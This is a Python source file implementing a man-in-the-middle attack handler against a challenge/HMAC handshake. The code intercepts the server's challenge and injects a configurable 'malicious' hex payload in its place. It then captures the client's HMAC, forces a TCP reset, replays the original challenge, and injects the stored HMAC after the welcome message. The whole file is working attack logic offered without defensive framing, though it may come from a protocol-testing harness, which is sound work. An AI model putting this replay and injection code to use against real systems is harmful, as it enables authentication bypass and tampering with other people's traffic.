import binascii

class MitmAttackHandler:
    def __init__(self, direction_name, payload_handler):
        self.direction_name = direction_name
        self.payload_handler = payload_handler
        self.attack_enabled = payload_handler.is_attack_mode_enabled(direction_name)
        self.attack_payload_hex = payload_handler.get_attack_payload(direction_name)
        self.attack_log = payload_handler.should_log_attack(direction_name)
        self.state = {
            'active': False,
            'stored_challenge': None,
            'stored_hmac': None,
            'injected': False,
            'phase': None,
            'original_challenge': None,
            'original_hmac': None,
            'replay_ready': False
        }
        if self.attack_enabled and self.attack_log:
            print(f"[MITM] Attack mode enabled for direction {direction_name}")

    async def process_message(self, raw_msg, original_data, writer):
        should_forward = True
        if not self.attack_enabled:
            return should_forward
        if isinstance(raw_msg, str) and raw_msg.startswith('#CHALLENGE#'):
            if not self.state['active']:
                self.state['active'] = True
                self.state['phase'] = 'waiting_hmac'
                self.state['original_challenge'] = original_data
                if self.attack_log:
                    print(f"[MITM] Intercepted challenge: {raw_msg}")
                try:
                    malicious_bytes = binascii.unhexlify(self.attack_payload_hex)
                except Exception as e:
                    print(f"[MITM] Error decoding malicious payload: {e}")
                    malicious_bytes = b''
                writer.write(malicious_bytes)
                await writer.drain()
                return False
        elif self.state['active'] and self.state['phase'] == 'waiting_hmac' and isinstance(raw_msg, (bytes, str)):
            self.state['stored_hmac'] = original_data
            self.state['phase'] = 'waiting_reconnect'
            if self.attack_log:
                print(f"[MITM] Stored HMAC from client. Triggering TCP reset.")
            writer.close()
            await writer.wait_closed()
            return False
        elif self.state['active'] and self.state['phase'] == 'waiting_reconnect' and self.state['original_challenge']:
            writer.write(self.state['original_challenge'])
            await writer.drain()
            self.state['phase'] = 'waiting_welcome'
            if self.attack_log:
                print(f"[MITM] Replayed original challenge to client after reconnect.")
            return False
        elif self.state['active'] and self.state['phase'] == 'waiting_welcome' and isinstance(raw_msg, str) and raw_msg.startswith('#WELCOME#'):
            if not self.state['injected'] and self.state['stored_hmac']:
                writer.write(self.state['stored_hmac'])
                await writer.drain()
                if self.attack_log:
                    print(f"[MITM] Injected stored HMAC and malicious payload after handshake.")
                self.state['injected'] = True
            return True
        return should_forward 